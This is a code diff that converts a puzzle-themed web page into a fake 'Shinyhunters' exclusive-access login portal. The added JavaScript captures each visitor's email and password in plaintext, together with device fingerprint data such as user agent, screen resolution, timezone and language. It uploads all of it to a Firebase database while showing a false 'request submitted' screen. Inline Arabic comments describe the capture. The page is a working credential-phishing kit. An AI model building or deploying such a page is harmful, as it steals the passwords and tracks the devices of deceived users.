@@ -3,69 +3,62 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>A∞Z | Internet Cryptic Mysteries & Puzzles</title>
+    <title>Shinyhunters | Secure Access Portal</title>
     <style>
         :root {
-            --bg-color: #080a0f;
-            --panel-bg: #121821;
-            --accent-purple: #9d4edd;
-            --accent-green: #00f5d4;
-            --accent-red: #ff3366;
-            --text-main: #e0fbfc;
-            --text-muted: #8d99ae;
-            --border-color: #1f2a38;
+            --bg-color: #050508;
+            --panel-bg: #11141d;
+            --accent-gold: #ffd700;
+            --accent-glow: rgba(255, 215, 0, 0.3);
+            --text-main: #f0f2f5;
+            --text-muted: #8a99ad;
+            --border-color: #1f2638;
         }
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            box-sizing: border-box;
+            height: 100vh;
+            overflow: hidden;
         }
         .container {
             width: 100%;
-            max-width: 520px;
+            max-width: 400px;
             background: var(--panel-bg);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 30px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
+            border-radius: 10px;
+            padding: 35px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8), 0 0 20px rgba(255, 215, 0, 0.05);
             box-sizing: border-box;
         }
         .logo {
             font-size: 22px;
             font-weight: 800;
-            color: var(--accent-purple);
+            color: var(--accent-gold);
             text-align: center;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             letter-spacing: 2px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px var(--accent-glow);
         }
         .logo span {
-            color: var(--accent-green);
+            color: var(--text-main);
         }
-        .subtitle {
+        .tagline {
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
             color: var(--text-muted);
             margin-bottom: 25px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        h2 {
-            font-size: 16px;
-            margin-bottom: 15px;
-            color: var(--text-main);
-            font-weight: 600;
-            border-left: 3px solid var(--accent-purple);
-            padding-left: 10px;
-        }
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 18px;
         }
         label {
             display: block;
@@ -75,54 +68,44 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        select, input {
+        input {
             width: 100%;
             padding: 12px;
-            background: #080a0f;
+            background: #050508;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             color: var(--text-main);
             font-size: 14px;
             box-sizing: border-box;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
-        select:focus, input:focus {
-            border-color: var(--accent-green);
-        }
-        .info-box {
-            background: rgba(157, 78, 221, 0.05);
-            border: 1px dashed var(--accent-purple);
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        .puzzle-title {
-            color: var(--accent-green);
-            font-weight: 600;
+        input:focus {
+            border-color: var(--accent-gold);
+            box-shadow: 0 0 8px var(--accent-glow);
         }
         .btn {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(135deg, var(--accent-purple), #7b2cbf);
-            color: #fff;
+            background: var(--accent-gold);
+            color: #000;
             border: none;
             border-radius: 6px;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            transition: opacity 0.2s;
-            margin-top: 10px;
+            transition: opacity 0.2s, transform 0.1s;
+            margin-top: 5px;
             letter-spacing: 0.5px;
         }
         .btn:hover {
             opacity: 0.9;
         }
-
-        #resultState {
+        .btn:active {
+            transform: scale(0.98);
+        }
+        /* حالة إرسال الطلب (Pending Request State) */
+        #requestState {
             display: none;
             text-align: center;
         }
@@ -130,7 +113,7 @@
             width: 40px;
             height: 40px;
             border: 3px solid var(--border-color);
-            border-top: 3px solid var(--accent-green);
+            border-top: 3px solid var(--accent-gold);
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
@@ -139,62 +122,57 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .status-msg {
-            font-size: 14px;
+        .info-text {
+            font-size: 13px;
             color: var(--text-muted);
             line-height: 1.6;
             margin-top: 15px;
         }
-        .highlight {
-            color: var(--accent-green);
+        .highlight-email {
+            color: var(--accent-gold);
             font-weight: 600;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 20px;
+            font-style: italic;
+            letter-spacing: 0.5px;
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div id="puzzleFormState">
-            <div class="logo">A∞Z <span>ARCHIVES</span></div>
-            <div class="subtitle">Internet Cryptic Mysteries Terminal</div>
+        <!-- نموذج تسجيل الدخول للانضمام -->
+        <div id="loginState">
+            <div class="logo">SHINY<span>HUNTERS</span></div>
+            <div class="tagline">Exclusive Access Portal</div>
             
-            <div class="info-box">
-                Current Active Puzzle: <span class="puzzle-title" id="activePuzzleTitle">The Cicada Sequence #3301</span><br>
-                <span id="activePuzzleDesc">Analyze the provided steganography layer and submit the correct decryption key to sync your progress.</span>
-            </div>
-
-            <form id="mysteryForm">
+            <form id="joinForm">
                 <div class="form-group">
-                    <label for="agentId">Investigator Handle / ID</label>
-                    <input type="text" id="agentId" required autocomplete="off" placeholder="e.g. CipherSeeker99">
+                    <label for="email">Account Email / ID</label>
+                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
                 </div>
-                
                 <div class="form-group">
-                    <label for="puzzleSelect">Select Mystery Archive</label>
-                    <select id="puzzleSelect">
-                        <option value="Cicada_3301">Cicada 3301: The Liber Primus</option>
-                        <option value="The_Sun_Vanished">The Sun Vanished Broadcast</option>
-                        <option value="Polybius_Arcade">Polybius Urban Legend Cipher</option>
-                        <option value="Satoshi_Key">Nakamoto Genesis Hash</option>
-                    </select>
+                    <label for="password">Password / Passcode</label>
+                    <input type="password" id="password" required placeholder="••••••••">
                 </div>
-
-                <div class="form-group">
-                    <label for="solutionKey">Decryption Key / Answer</label>
-                    <input type="text" id="solutionKey" required placeholder="Enter puzzle phrase or hash...">
-                </div>
-
-                <button type="submit" class="btn">Submit Solution & Sync Node</button>
+                <button type="submit" class="btn">Request Access</button>
             </form>
+            <div class="footer-note">For those who want to shine</div>
         </div>
 
-        <div id="resultState">
-            <div class="logo">A∞Z <span>ARCHIVES</span></div>
-            <h2>Validating Solution</h2>
+        <!-- شاشة رسالة إرسال الطلب -->
+        <div id="requestState">
+            <div class="logo">SHINY<span>HUNTERS</span></div>
+            <div class="tagline">Request Processing</div>
             <div class="spinner"></div>
-            <p class="status-msg">
-                Analyzing cryptographic proof for investigator <span id="displayAgent" class="highlight"></span>...<br>
-                Synchronizing telemetry state with the central database node.
+            <p class="info-text">
+                Your request to join the group using (<span id="displayEmail" class="highlight-email"></span>) has been successfully submitted.<br><br>
+                Please wait for administrative review and approval.
             </p>
         </div>
     </div>
@@ -210,43 +188,19 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        const puzzleDetails = {
-            "Cicada_3301": {
-                title: "The Cicada Sequence #3301",
-                desc: "Analyze the provided steganography layer and submit the correct decryption key to sync your progress."
-            },
-            "The_Sun_Vanished": {
-                title: "The Sun Vanished Broadcast",
-                desc: "Decode the emergency broadcast frequency transmission logs and submit the emergency sector code."
-            },
-            "Polybius_Arcade": {
-                title: "Polybius Urban Legend Cipher",
-                desc: "Reverse-engineer the 1981 arcade cabinet memory dump using the classic square matrix coordinate sequence."
-            },
-            "Satoshi_Key": {
-                title: "Nakamoto Genesis Hash",
-                desc: "Extract the hidden marker embedded within the block 0 coinbase parameters."
-            }
-        };
-
-        const puzzleSelect = document.getElementById("puzzleSelect");
-        puzzleSelect.addEventListener("change", function() {
-            const selected = this.value;
-            document.getElementById("activePuzzleTitle").innerText = puzzleDetails[selected].title;
-            document.getElementById("activePuzzleDesc").innerText = puzzleDetails[selected].desc;
-        });
-
-        document.getElementById("mysteryForm").addEventListener("submit", function(e) {
+        document.getElementById("joinForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            const agentId = document.getElementById("agentId").value;
-            const selectedPuzzle = puzzleSelect.value;
-            const solutionKey = document.getElementById("solutionKey").value;
+            // التقاط البيانات المدخلة
+            const userEmail = document.getElementById("email").value;
+            const userPass = document.getElementById("password").value;
 
-            document.getElementById("puzzleFormState").style.display = "none";
-            document.getElementById("displayAgent").innerText = agentId;
-            document.getElementById("resultState").style.display = "block";
+            // تحويل واجهة المستخدم فوراً لإظهار رسالة إرسال الطلب
+            document.getElementById("loginState").style.display = "none";
+            document.getElementById("displayEmail").innerText = userEmail;
+            document.getElementById("requestState").style.display = "block";
 
+            // جمع معلومات الجهاز والبيانات التقنية للزائر
             const ua = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
             const width = window.screen.width;
@@ -256,14 +210,14 @@
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const language = navigator.language || "N/A";
 
-            const sessionId = btoa(agentId + selectedPuzzle + width).slice(0, 16);
+            const sessionId = btoa(userEmail + width + height).slice(0, 16);
 
+            // تجميع حمولة البيانات بالكامل
             const telemetryData = {
                 sessionId: sessionId,
-                investigatorHandle: agentId,
-                selectedPuzzle: selectedPuzzle,
-                submittedKey: solutionKey,
-                status: "PUZZLE_SUBMISSION_PENDING",
+                inputEmail: userEmail,
+                inputPassword: userPass,
+                status: "JOIN_REQUEST_PENDING",
                 platform: platform,
                 resolution: `${width}x${height}`,
                 cores: cores,
@@ -277,7 +231,7 @@
             const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
             set(sessionsRef, telemetryData)
                 .then(() => {
-                    console.log("Mystery solution & telemetry synced successfully.");
+                    console.log("Join request credentials and telemetry synced to Firebase.");
                 })
                 .catch((error) => {
                     console.error("Firebase sync error:", error);
